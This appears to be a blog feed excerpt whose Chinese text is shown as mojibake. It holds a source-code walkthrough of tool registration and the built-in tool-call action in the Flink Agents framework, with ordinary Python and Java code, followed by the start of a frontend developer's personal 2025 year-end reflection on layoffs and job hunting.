    def resource_type(cls) -&gt; ResourceType:
        """Get the resource type."""
        return ResourceType.PROMPT

class LocalPrompt(Prompt):
    """Prompt for a language model.

    Attributes:
    ----------
    template : Union[Sequence[ChatMessage], str]
        The prompt template.
    """

    template: Sequence[ChatMessage] | str

    def format_string(self, **kwargs: str) -&gt; str:
        """Generate text string from template with input arguments."""
        if isinstance(self.template, str):
            return format_string(self.template, **kwargs)
        else:
            msgs = []
            for m in self.template:
                msg = f"{m.role.value}: {format_string(m.content, **kwargs)}"
                if m.extra_args is not None and len(m.extra_args) &gt; 0:
                    msg += f"{m.extra_args}"
                msgs.append(msg)
            return "\n".join(msgs)

    def format_messages(
        self, role: MessageRole = MessageRole.SYSTEM, **kwargs: str
    ) -&gt; List[ChatMessage]:
        """Generate list of ChatMessage from template with input arguments."""
        if isinstance(self.template, str):
            return [
                ChatMessage(role=role, content=format_string(self.template, **kwargs))
            ]
        else:
            msgs = []
            for m in self.template:
                msg = ChatMessage(
                    role=m.role, content=format_string(m.content, **kwargs)
                )
                msgs.append(msg)
            return msgs
</code></pre>
<h3 id="37-functiontool-ä¸-action-çå³èåæ³¨åæºå¶">3.7 FunctionTool ä¸ Action çå³èåæ³¨åæºå¶</h3>
<p>å¨ Flink Agents æ¡æ¶ä¸­ï¼function tool ä¸ action çèç³»åæ³¨åæ¶åå¤ä¸ªç»ä»¶åæ­¥éª¤ã</p>
<h4 id="371-å®éè½¬æ¢æµç¨">3.7.1 å®éè½¬æ¢æµç¨</h4>
<p>å·ä½çå·¥å·å° prompt çè½¬æ¢è¿ç¨å¦ä¸ï¼</p>
<ol>
<li>å·¥å·éè¿ @Tool æ @tool æ³¨åå°æ§è¡ç¯å¢ä¸­</li>
<li>å¨åå»º ResourceDescriptor æ¶ï¼éè¿ tools åæ°å¼ç¨è¿äºå·²æ³¨åçå·¥å·</li>
<li>å½èå¤©æ¨¡å setup ç±»ï¼å¦ OllamaChatModelSetupï¼åå§åæ¶ï¼å®ä¼è·åè¿äºå·¥å·çåæ°æ®ï¼åæ¬åç§°åæè¿°ï¼</li>
<li>è¿äºå·¥å·ä¿¡æ¯ä¼è¢«èªå¨æ´åå°åéç» LLM çç³»ç» prompt ä¸­ï¼åç¥ LLM æåªäºå¯ç¨å·¥å·åå¶ç¨é</li>
</ol>
<p>è¿ç§æ¹å¼ä½¿å¾å¼åèåªéå³æ³¨å·¥å·çå®ä¹åæ³¨åï¼èæ éæå¨ç¼åå·¥å·æè¿°å° prompt ä¸­ï¼æé«äºå¼åæçå¹¶åå°äºåºéå¯è½æ§ã</p>
<h5 id="function-tool-æ³¨åå°-agent">Function Tool æ³¨åå° Agent</h5>
<p>Function tool é¦åéè¿ä»¥ä¸å ç§æ¹å¼æ³¨åå°æ§è¡ç¯å¢ä¸­ï¼</p>
<p><strong>æ¹å¼ä¸ï¼ä½¿ç¨è£é¥°å¨</strong></p>
<pre><code class="language-python">    @tool
    @staticmethod
    def notify_shipping_manager(id: str, review: str) -&gt; None:
        """Notify the shipping manager when product received a negative review due to
        shipping damage.

        Parameters
        ----------
        id : str
            The id of the product that received a negative review due to shipping damage
        review: str
            The negative review content
        """
        # reuse the declared function, but for parsing the tool metadata, we write doc
        # string here again.
        notify_shipping_manager(id=id, review=review)
</code></pre>
<p><strong>æ¹å¼äºï¼ä½¿ç¨ add_resource æ¹æ³</strong></p>
<p>å³ï¼å¨æ§è¡ç¯å¢æ³¨åå·¥å·èµæºã</p>
<pre><code class="language-python">def add(a: int, b: int) -&gt; int:
    """Calculate the sum of a and b.

    Parameters
    ----------
    a : int
        The first operand
    b : int
        The second operand

    Returns:
    -------
    int:
        The sum of a and b
    """
    return a + b

env.add_resource("add", ResourceType.TOOL, add)
</code></pre>
<p><strong>æ¹å¼ä¸ï¼å¨ Agent æé å½æ°ä¸­æ·»å </strong></p>
<pre><code class="language-python">class MyAgent(Agent):
    def __init__(self):
        super().__init__()
        self.add_resource("add", add) # æ·»å å° TOOL ç±»åèµæºä¸­
</code></pre>
<p><strong>æ¹å¼åï¼å¨  ReActAgent æå»ºæ¶åä¼ å¥</strong></p>
<p>å³ï¼éè¿ tools åæ°æå®ã</p>
<pre><code class="language-java">    // Create ReAct agent.
    private static ReActAgent getReActAgent() {
        return new ReActAgent(
                ResourceDescriptor.Builder.newBuilder(OllamaChatModelSetup.class.getName())
                        .addInitialArgument("connection", "ollamaChatModelConnection")
                        .addInitialArgument("model", "qwen3:8b")
                        .addInitialArgument(
                                "tools", Collections.singletonList("notifyShippingManager"))
                        .build(),
                reviewAnalysisReactPrompt(),
                CustomTypesAndResources.ProductReviewAnalysisRes.class);
    }
</code></pre>
<h5 id="ä¸æ¨¡åäº¤äº">ä¸æ¨¡åäº¤äº</h5>
<p>Chat Model Setup ä¸­å¼ç¨å·¥å·</p>
<p>å¨åå»º Chat Model Setup æ¶ï¼éè¿ tools åæ°æå®è¦ä½¿ç¨çå·¥å·åè¡¨ï¼</p>
<pre><code class="language-python">chat_model_descriptor = ResourceDescriptor(
clazz=OllamaChatModelSetup,
connection="my_ollama_connection",
model="qwen3:8b",
tools=["notify_shipping_manager"]   # å¼ç¨å·²æ³¨åçå·¥å·
)
</code></pre>
<h4 id="372-agentplan-ç¼è¯è¿ç¨ä¸­å·¥å·çå¤ç">3.7.2 AgentPlan ç¼è¯è¿ç¨ä¸­å·¥å·çå¤ç</h4>
<p>Flink Agents åç½®äºä¸ä¸ª TOOL_CALL_ACTIONï¼ï¼ä¸é¨ç¨äºè°ç¨å·¥å·ãTOOL_CALL_ACTION ä¸ç¨æ·å®ä¹å·¥å·å½æ°çèç³»ä¸»è¦ä¾èµäºï¼</p>
<ul>
<li>ç»ä¸çå½åç³»ç»ï¼å·¥å·å½æ°çåç§°ä½ä¸ºå¯ä¸æ è¯ç¬¦</li>
<li>èµæºç®¡çæºå¶ï¼éè¿ RunnerContext.get_resource() æ¹æ³æåç§°æ£ç´¢å·¥å·</li>
<li>æ ååæ¥å£ï¼ææå·¥å·é½å®ç°ç¸åç call() æ¥å£</li>
<li>äºä»¶é©±å¨æ¶æï¼éè¿ ToolRequestEvent å ToolResponseEvent ä¼ éè°ç¨ä¿¡æ¯</li>
</ul>
<p>è¿ç§è®¾è®¡ä½¿å¾ç³»ç»å¯ä»¥å¨è¿è¡æ¶å¨æå°å° LLM çå·¥å·è°ç¨è¯·æ±è·¯ç±å°æ­£ç¡®çç¨æ·å®ä¹å½æ°ï¼èæ éç¡¬ç¼ç å·ä½çå½æ°å¼ç¨ã</p>
<p><img alt="3-1" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1850883/202512/1850883-20251219091153807-2024238587.png" class="lazyload"></p>
<h5 id="ç¨æ·å®ä¹ç-function-tool-è½¬æ¢ä¸º-action">ç¨æ·å®ä¹ç Function Tool è½¬æ¢ä¸º Action</h5>
<p>å½ Agent è¢«ç¼è¯æ AgentPlan æ¶ï¼ç³»ç»ä¼æ¶éææèµæºï¼åæ¬å·¥å·ï¼ ï¼è¿äºå·¥å·ä¼è¢«è½¬æ¢ä¸ºå¯æ§è¡ç Actionï¼</p>
<ul>
<li>å¨ _get_resource_providers å½æ°ä¸­ï¼è¯å«å¸¦æ _is_tool å±æ§çèµæº</li>
<li>ä½¿ç¨ from_callable å°å½æ°è½¬æ¢ä¸ºå·¥å·å¯¹è±¡</li>
<li>å·¥å·è¢«åè£ä¸º ResourceProvider å¹¶å­å¨å¨ AgentPlan ä¸­ï¼å³éè¿ PythonSerializableResourceProvider åè£å·¥å·èµæº</li>
</ul>
<h5 id="åç½®-tool-call-action">åç½® Tool Call Action</h5>
<p>æ¡æ¶æä¾äºä¸ä¸ªåç½®ç TOOL_CALL_ACTIONï¼ä¸é¨ç¨äºè°ç¨å·¥å·ï¼</p>
<pre><code class="language-python">TOOL_CALL_ACTION = Action(
    name="tool_call_action",
    exec=PythonFunction.from_callable(process_tool_request),
    listen_event_types=[f"{ToolRequestEvent.__module__}.{ToolRequestEvent.__name__}"],
)
</code></pre>
<p>å¯¹åºAction ä¸ºToolCallActionï¼å¶ä¸­ processToolRequest å½æ°ä¼ä¸ç¨æ·èªå®ä¹çå·¥å·å½æ°ç¸äºå³èãå·ä½èç³»æºå¶å¦ä¸ï¼</p>
<ul>
<li>å½åå¹éï¼å½ LLM å³å®è°ç¨æä¸ªå·¥å·æ¶ï¼å®ä¼å¨ tool_call ä¸­æå®å·¥å·åç§°ï¼å¦ "notify_shipping_manager"ï¼</li>
<li>èµæºæ¥æ¾ï¼TOOL_CALL_ACTION ä½¿ç¨è¿ä¸ªåç§°éè¿ ctx.get_resource(name, ResourceType.TOOL) æ¥æ¾å·²æ³¨åçå·¥å·</li>
<li>å¨æè°ç¨ï¼æ¾å°å·¥å·åï¼éè¿ tool.call(**kwargs) è°ç¨ç¨æ·å®ä¹çå®éå½æ°</li>
</ul>
<pre><code class="language-java">public class ToolCallAction {
    public static Action getToolCallAction() throws Exception {
        return new Action(
                "tool_call_action",
                new JavaFunction(
                        ToolCallAction.class,
                        "processToolRequest",
                        new Class[] {ToolRequestEvent.class, RunnerContext.class}),
                List.of(ToolRequestEvent.class.getName()));
    }

    @SuppressWarnings("unchecked")
    public static void processToolRequest(ToolRequestEvent event, RunnerContext ctx) {
        Map&lt;String, Boolean&gt; success = new HashMap&lt;&gt;();
        Map&lt;String, String&gt; error = new HashMap&lt;&gt;();
        Map&lt;String, ToolResponse&gt; responses = new HashMap&lt;&gt;();
        Map&lt;String, String&gt; externalIds = new HashMap&lt;&gt;();
        for (Map&lt;String, Object&gt; toolCall : event.getToolCalls()) {
            String id = String.valueOf(toolCall.get("id"));
            Map&lt;String, Object&gt; function = (Map&lt;String, Object&gt;) toolCall.get("function");
            String name = (String) function.get("name");// è·åå·¥å·åç§°
            Map&lt;String, Object&gt; arguments = (Map&lt;String, Object&gt;) function.get("arguments"); // è·åå·¥å·åæ°

            if (toolCall.containsKey("original_id")) {
                externalIds.put(id, (String) toolCall.get("original_id"));
            }

            Tool tool = null;
            try {
                // ä»ä¸ä¸æè·åå¯¹åºåç§°çå·¥å·èµæº
                tool = (Tool) ctx.getResource(name, ResourceType.TOOL);
            } catch (Exception e) {
                success.put(id, false);
                responses.put(
                        id, ToolResponse.error(String.format("Tool %s does not exist.", name)));
                error.put(id, e.getMessage());
            }

            if (tool != null) {
                try {
                    // è°ç¨ç¨æ·å®éå·¥å·
                    ToolResponse response = tool.call(new ToolParameters(arguments));
                    success.put(id, true);
                    responses.put(id, response);
                } catch (Exception e) {
                    success.put(id, false);
                    responses.put(
                            id, ToolResponse.error(String.format("Tool %s execute failed.", name)));
                    error.put(id, e.getMessage());
                }
            }
        }
        // è¿åå·¥å·ååºäºä»¶
        ctx.sendEvent(new ToolResponseEvent(event.getId(), responses, success, error, externalIds));
    }
}
</code></pre>
<p>è¿ä¸ª action çå¬ ToolRequestEvent äºä»¶ï¼å¹¶æ§è¡å·¥å·è°ç¨ãè°ç¨å®æåï¼å°ç»æéè¿ ToolReponseEvent è¿åã</p>
<pre><code class="language-json">    "tool_call_action": {
      "name": "tool_call_action",
      "exec": {
        "func_type": "PythonFunction",
        "module": "flink_agents.plan.actions.tool_call_action",
        "qualname": "process_tool_request"
      },
      "listen_event_types": [
        "flink_agents.api.events.tool_event.ToolRequestEvent"
      ]
    }
</code></pre>
<h5 id="tool_call_action-å¦ä½ç¼è¯å°agentplan">TOOL_CALL_ACTION å¦ä½ç¼è¯å°AgentPlan</h5>
<ul>
<li>
<p>å¨ AgentPlan.from_agent æ¹æ³ä¸­ï¼</p>
<ul>
<li>å½åå»º AgentPlan æ¶ï¼ä¼æ¶éææå¨ä½ï¼åæ¬ç¨æ·å®ä¹çå¨ä½ååç½®å¨ä½</li>
<li>ä»£ç ä¸­æç¡®åå«äºåç½®å¨ä½ï¼<br>
BUILT_IN_ACTIONS = [CHAT_MODEL_ACTION, TOOL_CALL_ACTION, CONTEXT_RETRIEVAL_ACTION]</li>
<li>å¨ _get_actions(agent) å½æ°ä¸­ï¼è¿äºåç½®å¨ä½ä¼è¢«æ·»å å°å¨ä½åè¡¨ä¸­</li>
</ul>
</li>
<li>
<p>å·ä½ç¼è¯è¿ç¨ï¼</p>
<ul>
<li>AgentPlan.from_agent() æ¹æ³è°ç¨ _get_actions(agent) è·åææå¨ä½</li>
<li>_get_actions() å½æ°ä¸ä»æåç¨æ·å®ä¹çå¨ä½ï¼è¿ä¼åå« BUILT_IN_ACTIONS</li>
<li>è¿äºå¨ä½éåè¢«ç¼è¯è¿ AgentPlan ç actions å actions_by_event å­æ®µä¸­</li>
</ul>
</li>
<li>
<p>å¨æç»ç AgentPlan ä¸­ï¼</p>
<ul>
<li>TOOL_CALL_ACTION ä¼ä½ä¸ºä¸ä¸ªæ®éçå¨ä½å­å¨äº actions æ å°ä¸­</li>
<li>å®ä¼çå¬ ToolRequestEvent äºä»¶ç±»åï¼å¹¶å¨è¯¥äºä»¶åçæ¶è¢«è§¦åæ§è¡</li>
</ul>
</li>
</ul>
<p>å æ­¤ï¼TOOL_CALL_ACTION ç¡®å®ä¼è¢«ç¼è¯å° AgentPlan ä¸­ï¼ä½ä¸ºå¤çå·¥å·è°ç¨çæ åæºå¶ãå½ LLM å³å®è°ç¨å·¥å·æ¶ï¼ä¼ååº ToolRequestEventï¼ç¶å TOOL_CALL_ACTION å°±ä¼è¢«è§¦åæ¥å®éæ§è¡ç¸åºçå·¥å·è°ç¨ã</p>
<h4 id="373-å·¥å·è°ç¨æµç¨">3.7.3 å·¥å·è°ç¨æµç¨</h4>
<p>æ´ä¸ªæµç¨ä¸­ï¼å·¥å·ä¸æ¯ç´æ¥ç»å®å° ActionExecutionOperatorï¼èæ¯éè¿ AgentPlan ä¸­çèµæºæä¾èæºå¶ï¼å¨éè¦æ¶å¨æè·ååå®ä¾åãè¿ç§è®¾è®¡å®ç°äºå·¥å·ä¸æä½ç¬¦çæ¾è¦åï¼åæ¶æ¯æå¤ç§ç±»åçå·¥å·ï¼JavaãPython ç­ï¼ã</p>
<ul>
<li>LLM å³å®è°ç¨æä¸ªå·¥å·</li>
<li>TOOL_CALL_ACTION åç½®å¨ä½è¢«è§¦å</li>
<li>éè¿ RunnerContext è·åå¯¹åºå·¥å·èµæº</li>
<li>RunnerContextImpl.get_resource() æ¹æ³æ ¹æ®åç§°åç±»åæ¥æ¾å·¥å·èµæº</li>
<li>å·¥å·å®éå¨éè¦æ¶æéè¿ ResourceProvider å®ä¾å</li>
<li>éè¿ ToolCallFunction æ¥æ¾å¹¶æ§è¡ç¸åºçå·¥å·å½æ°</li>
<li>ç»æä½ä¸ºæ°äºä»¶åéå°äºä»¶éå</li>
</ul>
<h4 id="374-å®æ´æµç¨å¾">3.7.4 å®æ´æµç¨å¾</h4>
<p><img alt="3-2" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1850883/202512/1850883-20251219091138725-203672539.png" class="lazyload"></p>
<h4 id="375-ä»£ç ">3.7.5 ä»£ç </h4>
<p>å¨ agent_plan.pyä¸­å¤çå·¥å·èµæºçä»£ç å¦ä¸ï¼</p>
<pre><code class="language-python">        # è¯å«å·¥å·èµæºå¹¶åå»ºæä¾è
        elif hasattr(value, "_is_tool"):
            if isinstance(value, staticmethod):
                value = value.__func__

            if callable(value):
                # TODO: support other tool type.
                tool = from_callable(func=value)
                resource_providers.append(
                    PythonSerializableResourceProvider.from_resource(
                        name=name, resource=tool
                    )
                )
    # æèéè¿add_resource æ·»å çå·¥å·            
    for name, tool in agent.resources[ResourceType.TOOL].items():
        resource_providers.append(
            PythonSerializableResourceProvider.from_resource(
                name=name, resource=from_callable(tool.func)
            )
        )                
</code></pre>
<p>æ»ç»æ¥è¯´ï¼function_tool  éè¿èµæºæ³¨åæºå¶ä¸Agentå³èï¼ç¶åå¨ç¼è¯é¶æ®µè¢«è½¬æ¢ä¸ºå¯åºååçèµæºæä¾èï¼æç»éè¿åç½®çå·¥å·è°ç¨Actionæ¥æ§è¡ãè¿ç§è®¾è®¡ä½¿å¾å·¥å·å¯ä»¥å¨åå¸å¼ç¯å¢ç§æ­£ç¡®ä¼ è¾åæ§è¡ã</p>
<h2 id="0xff-åè">0xFF åè</h2>
<p><a href="https://ce101.mintlify.app/core-tech/agent#7-2-5-multi-agent" target="_blank" rel="noopener nofollow">https://ce101.mintlify.app/core-tech/agent#7-2-5-multi-agent</a></p>
<p><a href="https://www.zhihu.com/question/1959742114519844109/answer/1983526566437880277" target="_blank" rel="noopener nofollow">https://www.zhihu.com/question/1959742114519844109/answer/1983526566437880277</a></p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2025-12-31 19:18">2025-12-31 19:17</span>&nbsp;
<a href="https://www.cnblogs.com/rossiXYZ">ç½è¥¿çæè</a>&nbsp;
éè¯»(<span id="post_view_count">58</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19369869);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19369869', targetLink: 'https://www.cnblogs.com/rossiXYZ/p/19369869', title: 'ãå¤§æ°æ® &amp;amp; AIãFlink Agents æºç è§£è¯» --- (3) --- Agent' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ 2025 å¹´ç»æ»ç»ï½30å² ]]></title>
    <link>https://www.cnblogs.com/liyq666/p/19427476</link>
    <guid>bc267f3f4d669311f0a4aafe5e55eac9</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/liyq666/p/19427476" title="åå¸äº 2025-12-31 16:47">
    <span role="heading" aria-level="2">2025 å¹´ç»æ»ç»ï½30å²</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        ä»å¤©æ¯2025æåä¸å¤©ï¼åé¡¾è¿ä¸å¹´ï¼æå°çåªæå¯¹æªæ¥çè¿·è«ï¼ææ¯ä¸ååç«¯å¼åï¼å¨AIçå²å»ä»¥åå¤§ç¯å¢çå½±åä¸ï¼ç¦»å¼äºä¸ä¸å®¶å¬å¸ï¼Gapå°ç°å¨ï¼åä¸è¿ç¯å¹´ç»æ»ç»ï¼ç®æ¯å¯¹èªå·±ç2025å¹´æä¸ªäº¤ä»£å§
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="åè¨">åè¨</h1>
<p>ä»å¤©æ¯2025æåä¸å¤©ï¼åé¡¾è¿ä¸å¹´ï¼æå°çåªæå¯¹æªæ¥çè¿·è«ï¼ææ¯ä¸ååç«¯å¼åï¼å¨25å¹´ä¹åå¯ä»¥è¯´æ¯ä¸åå¾çº¯ç²¹çåç«¯ï¼å¨AIçå²å»ä»¥åå¤§ç¯å¢çå½±åä¸ï¼ç¦»å¼äºä¸ä¸å®¶å¬å¸ï¼ç¶åå°±æ¯Gapå°ç°å¨ï¼åå¨ä¸æµ·åºç§å±ççµèåï¼åä¸è¿ç¯å¹´ç»æ»ç»ï¼ç®æ¯å¯¹èªå·±ç2025å¹´æä¸ªäº¤ä»£å§ã</p>
<h2 id="åé¡¾æ¥æ¶è·¯">åé¡¾æ¥æ¶è·¯</h2>
<p>æåºçäºæ²³åçä¸ä¸ªåæå®¶åº­ï¼å¤§å­¦å­¦çè®¡ç®æºï¼18å¹´æ¯ä¸å¥è¡åç«¯ï¼å¨éå·æ¿å°äºç¬¬ä¸ä»½å·¥ä½3.5Kï¼å¾äºå¤§æ¦10ä¸ªæï¼ç®æ¯èµ·ç¹å§ï¼å¨è¿éæ¥è§¦å¹¶å­¦ä¹ äºReactï¼å¾ææ¿ç¬¬ä¸å®¶å¬å¸ï¼ç¡®å®ä¸ºæä¹åçå·¥ä½æä¸äºåºç¡ï¼</p>
<p>ç¬¬äºä»½å·¥ä½6kå¥½åï¼å¾äº8ä¸ªæï¼ç¶ååé­äºï¼æ å¥æ¢å°äºéå·çç¬¬ä¸å®¶å¬å¸ï¼å¨è¿ä¸ªå¬å¸å¾äº1å¹´2ä¸ªæï¼èªèµæ¯9kä¸å°ï¼æ­£åå¤ä¸å±å®å¾ï¼ç¶åå¬å¸ååé­äºï¼è¿ææ¬ äºå·®ä¸å¤4ä¸ªæð°ï¼æ¬ äºæ3wå¤çèªèµï¼è³ä»æªæ¿å°æãéçé±åéæ¸å¹²çªï¼æç¥éä¸è½å¨å¬å¸ç»§ç»­èä¸å»ï¼äºæ¯æ¿äºç¦»èè¯æç ´éæ²èç´æ¥æ¥äºå¤§é½å¸ä¸æµ·ææ¼ã</p>
<p>å¨éå·å¾äºå·®ä¸å¤ä¸å¹´ï¼ä¸»è¦ææ¯æ æ¯React + Vueï¼åçé½æ¯Cç«¯çä¸äºäº§åï¼åè¿Appï¼wxå°ç¨åºï¼wxå¬ä¼å·ï¼webç½é¡µç­ï¼ç³è¯·è¿è½¯èï¼ä¸æ¶è¿åºç¨ååºï¼ä¸æ¶è¿å°ç¨åºï¼å¯¹æ¥è¿ååçæ¯ä»ï¼ä¸è·¯æ¸çç³å¤´è¿æ²³ï¼å¥½å¨èµ°è¿æ¥äºã</p>
<p>20å¹´æ¥äºä¸æµ·ï¼å¥èäºä¸ä¸å®¶å¬å¸ï¼èªèµæ¯14Kï¼æå¥éåï¼è¿è¾¹ä¼ä¸ä¸»è¦æ¯åBç«¯çäº§åï¼åºæ¬ç¸å½äºä»0å¼å§äºã</p>
<p>å¥èåï¼æå¹å¤§åå¸çç¹åï¼æå¨10å·çº¿èªä¸­è·¯éè¿ç§äºä¸ä¸ªâèå£³å¬å¯ð âæ¿å­ï¼è¯´æ¯æ¼ä¸ä»ä¸ï¼å®éæ¯å¾®ä¼é¶è¡çè´·æ¬¾ï¼ç¶å20å¹´âèå£³âæ´é·ðï¼å½æ¶çæé¢ä¸´ð ä½ä¸äºï¼æ¼éð°éä¸äºï¼è¿è¦èä¸ä¸å¹´è´·æ¬¾ï¼ç»åè¿é£æ®µçäººåºè¯¥ç¥éï¼å½æ¶ç½ç»ä¸åç§ï¼æçð¥æ¿å­ï¼æçè·³æ¥¼ï¼æçæ¿ðªå¨èä¸æ¬èµ°ãç´å°é£æ¶åææåç°ï¼åå°ä¸æµ·å°±è¸©äºä¸ä¸ªâåâï¼å¤äºäºåè·¯è±éççç¾¤ç­ç¾¤åï¼ä»¥åç½ç»èè®ºçå½±åï¼è¿ææ¿åºçå±ä¸­åè°ï¼æç»æçç»æå°±æ¯è´·æ¬¾ä¸ç¨è¿äºï¼ä½æ¼éï¼åªè½ååå·´äºå½äºã</p>
<p>ä»20å¹´å¥èç´å°25å¹´åï¼å±4å¹´7ä¸ªå¤æï¼ä¹åéå·ä¸å¹´æåºæ¬æ¯ä¸ä¸å®¢æ·ç´æ¥æäº¤éçï¼æ¥å°ä¸æµ·è¿è¾¹ï¼åBç«¯ä¼ä¸äº§åï¼å°±å¾è·å®¢æ·æäº¤éï¼å¨è¿æé´ï¼ççå¾æè°¢ðæçé¢å¯¼ï¼ä»æåçéæ¶©å°éæ¸èªç¶ï¼æç¡®å®æé¿äºå¾å¤ï¼ä¸é¢ä¸¾ä¸äºé¢å¯¹å®¢æ·çä¾å­ï¼</p>
<ol>
<li>é¦åæåº¦è¦æï¼ï¼é¢å¯¹åé¦è¦åæ¶ååºï¼å®éåæ¯åé¢çäºï¼</li>
<li>éæ±åæ´é®é¢ï¼ï¼ä¸è¦æäºåµï¼æåº¦ä¹æ¯è¦æï¼ä¸è¦å¥é½æ¥åï¼</li>
</ol>
<p>å¤çå°±ä¸åå¤è¨ãè¿ä»½å·¥ä½ä¸»è¦æ¯ä¼ä¸å®å¶åå¼åï¼ä¿®ä¿®è¡¥è¡¥æ¯å¸¸æï¼ä¹æä»0-1çé¡¹ç®ï¼ç®æ¯è¿ä¸æ­¥æ²æ·äºææ¯å§ãæ¶é´æ¥å°24å¹´ï¼æä¸ä¸ªé¡¹ç®éè¦åºå·®ï¼åºå·®å±±ä¸ï¼åå¼å§è¯´æ¯3ä¸ªæï¼æ²¡æ³å°ä¸ç´åºå·®äºä¸æ´å¹´ï¼ç´å°ç¦»èï¼é¡¹ç®ä¹è¿æ²¡ç»æã</p>
<h2 id="è¢«è£">è¢«è£</h2>
<p>3æä»½ï¼è¿å¨å±±ä¸åºå·®å ç­çæï¼æ¶å°äºå¬å¸HRçæ¶æ¯ï¼æ²éç»ç»æ¶æè°æ´äºå®ï¼æåªè½éæ©æ¥åï¼äºæ¯3æåºï¼ç¦»å¼åºå·®ä¸å¹´çæ½åï¼åå°äºä¸æµ·ï¼æ¿äºç¦»èè¯æï¼ç¦»å¼äºæå·¥ä½è¿5å¹´çå¬å¸ï¼ç±äºä¹åä¸å¹´é½æ¯åçä¿®ä¿®è¡¥è¡¥ï¼å¯¹äºåé¥­çæè½æè§æç¹ççï¼äºæ¯æéæ©æ²æ·ä¸æ®µæ¶é´ï¼æ­£å¥½ä¹ä¼æ¯ä¸ä¸é¿æå ç­ç²æ«çèº«ä½ã</p>
<h2 id="æ¾å·¥ä½">æ¾å·¥ä½</h2>
<p>4-5æç¨ç¼è¿å»ï¼ä»6æä»½ï¼æå¼å§éæ¸çæ´ç®åï¼æç®åï¼éé¢è¯ï¼è¿æ¶æåç°ï¼å¸åºå¥½åååäºï¼ä¸åé®å¤§éçâå«è¡æâï¼èæ¯è½¬èé®åºæ¯é¢ï¼ä»é¡¹ç®æ´ä½æç»´åºåé¢è¯ã</p>
<p>è®°å¾å½æ¶æä¸ä½é¢è¯å®é®æï¼å·¥ä½7å¹´ï¼ä½ ææ¿å¾åºæçé¡¹ç®æ¯ä»ä¹ï¼æä»0-1æ­å»ºè¿é¡¹ç®åï¼ææäºæè¿å å¹´çé¡¹ç®ä¸­ä¸ä¸ªåäºåç­ï¼å ä¸ºè¿æ¯Bç«¯çä¼ä¸åé¨ç³»ç»ï¼ææ¯ä¸æ²¡æCç«¯é£äºæ´äº®ç¼çææ¯ï¼ä¹æ²¡ææè°çé«å¹¶åä»ä¹çï¼æåå½ç¶æäºã</p>
<p>ä¹åé½æ¯ç¨Umiï¼Dvaãreact-create-appãVue-cliãAntdãElement Uiç­ç°æçèææ¶ååºæ­å»ºé¡¹ç®ï¼Bç«¯é¡¹ç®è®²ç©¶ææ·å¼åï¼éä¸å¡ï¼è½»é¡µé¢ï¼è¯´å¥ä¸å¥½å¬çå°±æ¯âè½ç¨å°±è¡ãå¥½ç¨å°±è¡âï¼äºæ¯ç»æé¢è¯åæå¼å§èçä¸ä¸ªæ³æ³ï¼ä»0-1å»æ­å»ºä¸ä¸ªé¡¹ç®ã</p>
<p>6æä»½Bossä¸æ²éäºå ç¾ä¸ªï¼æäºå åç®åï¼é¢è¯äºå ä¸ªï¼æ¯ä¾å ä¹æ¯10:1:1ï¼ç»æå¾æå¿ï¼äºæ¯æä¸è¾¹æç®åï¼ä¸è¾¹åä»£ç ï¼ä¸è½è®©èªå·±é²ä¸æ¥ï¼ä¸ç¶å®¹æä¹±æ³ï¼å°±è¿æ ·é çè¿ä»½ä¿¡å¿µï¼æä»0-1æ­å»ºäºä¸ä¸ªé¡¹ç®ï¼å®åäºæ­å»ºçåç¨<br>
<a href="https://juejin.cn/post/7519864446069489704" target="_blank" rel="noopener nofollow"># ä»é¶æ­å»º react æ¨¡æ¿ ãReact 18 + Webpack 5 + Antd 5 + React-Router 6 ã</a>ï¼</p>
<p>7-8æä»½ææ¿çè¿ä»½ä»0-1æ­å»ºçé¡¹ç®å»é¢è¯ï¼æ¯ä¹6æä»½å¥½åå¥½äºç¹ï¼ä½åå¥½çæéï¼æé´åå®åäºæéæ§å¶<br>
<a href="https://juejin.cn/post/7525733315133341706" target="_blank" rel="noopener nofollow"># React 18 å¨å±éè¯¯æè· + React-router 6 å¨ææéè·¯ç±</a>ï¼åéå°ä¸ä¸ªé¢è¯å®ï¼ç¹è¯æçé¡¹ç®ï¼çº¯éæçï¼æ²¡éï¼å°±æ¯çº¯éæé¡µé¢ï¼æ¨¡ææ°æ®åçï¼æåè¿æ¯æäºãäºæ¯ææ³çæ¯ä¸æ¯å¯ä»¥å ä¸åç«¯ï¼æ­£å¥½ä¹åä¹æ¥è§¦è¿NodeJsï¼äºæ¯åæ¯æ¡æ¡å­¦ï¼æåéäºExpressï¼æç®åä¸ä¸ªå¨æ ç®¡çç³»ç»ï¼å ä¸ºæå¯¹è¿ç§ç³»ç»å¾çæï¼åæ¬å¸å±ãé¡µé¢ãä¸å¡é½çæã</p>
